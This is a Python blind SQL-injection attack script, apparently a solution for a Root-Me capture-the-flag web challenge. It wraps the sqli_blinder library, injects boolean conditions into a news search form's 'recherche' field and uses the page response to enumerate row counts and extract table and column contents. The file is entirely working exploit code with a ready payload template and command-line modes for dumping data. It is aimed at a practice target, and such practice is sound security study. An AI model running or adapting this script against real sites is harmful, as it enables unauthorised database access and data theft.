

import sqli_blinder
import requests
import argparse

def request_func(sql):
	"""this function must return True for sql=`1=1` and False for sql=`1=0`"""
	
	http_proxy   = "http://localhost:8080"
	proxyDict = { 
				 "https"   : http_proxy,	
				 "http"   : http_proxy
				}
	##
	proxyDict = None

	burp0_url = "http://challenge01.root-me.org:80/web-serveur/ch19/?action=recherche"
	burp0_headers = {"User-Agent": "fefefe", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://challenge01.root-me.org", "Connection": "close", "Referer": "http://challenge01.root-me.org/web-serveur/ch19/?action=recherche", "Upgrade-Insecure-Requests": "1"}
	burp0_data = {"recherche": "f' or (%s) -- " % sql}
	r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data,proxies=proxyDict)
	
	if r.status_code != 200:
		raise Exception('code: %d, ошибка sql: %s'%(r.status_code,sql))
	if "Unable to prepare statement" in r.text:
		raise Exception('code: %d, ошибка sql: %s'%(r.status_code,sql))
	if "News system" in r.text:
		return True
	else:
		return False

def required(arg,mode):
	print ('argument %s is required for mode %s' % (arg,mode))
	exit(-1)

if __name__=='__main__':
	parser = argparse.ArgumentParser()
	parser.add_argument("mode",help="mode - one of ['check','count','one','get']",choices= ['check','count','one','get'])
	parser.add_argument("-t","--table",
						help = "table nmae");
	parser.add_argument("-c","--column",
						help="column names. For get mode could by comma separated array of columns")
	parser.add_argument("-w", "--where", 
						help="where clause")
	parser.add_argument('-i','--index',help='index of row')
	parser.add_argument("--threads",help="number of threads",type=int,default=16)
	parser.add_argument('--dbms',help="DBMS",choices= ['mysql','mssql','sqlite','oracle'],required=True)


	args = parser.parse_args()
	if args.threads <=0 :
		print ('threads > 0')
		exit(-1)
	if args.threads == 1:
		multithreaded = False
	else:
		multithreaded = True

	sqlib = sqli_blinder.SQLiBlinder(request_func,args.dbms,multithreaded=multithreaded,threads=args.threads)

	if args.mode == 'check':
		check = sqlib.check()
		print (check)
		exit(0)
	elif args.mode == 'count':
		if args.table is None:
			required('table',args.mode)
		print (sqlib.get_count(args.table,args.where))
		exit(0)
	elif args.mode == 'one':
		if args.index is None:
			required('index',args.mode)
		if args.table is None:
			required('table',args.mode)
		if args.column is None:
			required('column',args.mode)
		print (sqlib.get_string(args.table,args.column,args.index,args.where))
		exit(0)
	elif args.mode == 'get':
		if args.table is None:
			required('table',args.mode)
		if args.column is None:
			required('column',args.mode)
		print (sqlib.get(args.column.split(','),args.table,args.where))
		exit(0)
